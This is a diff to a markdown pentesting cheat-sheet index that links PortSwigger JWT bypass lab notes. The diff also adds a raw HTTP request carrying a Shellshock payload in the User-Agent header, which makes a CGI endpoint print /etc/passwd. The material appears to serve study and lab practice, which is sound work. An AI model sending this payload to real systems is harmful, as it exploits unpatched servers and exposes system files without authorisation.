@@ -449,7 +449,7 @@ system('ls')
 ### Recon
 
 - [unverified signature](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-unverified-signature)
-- ["alg":"none"](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-flawed-signature-verification)
+- ["alg":"none" or "alg": "None"](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-flawed-signature-verification)
 - Brute-forcing secret keys using hashcat
   - [Document](../port-swigger/jwt.md#brute-forcing-secret-keys-using-hashcat)
   - [1](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-weak-signing-key)
@@ -464,6 +464,11 @@ system('ls')
 - algorithm confusion
   - [1 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion)
   - [2 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
+
+HEAD /cgi-bin/status HTTP/1.1
+User-Agent: () { :;}; echo \$(</etc/passwd)
+Host: vulnerable
+Connection: close
 
 ## Path traversal
 
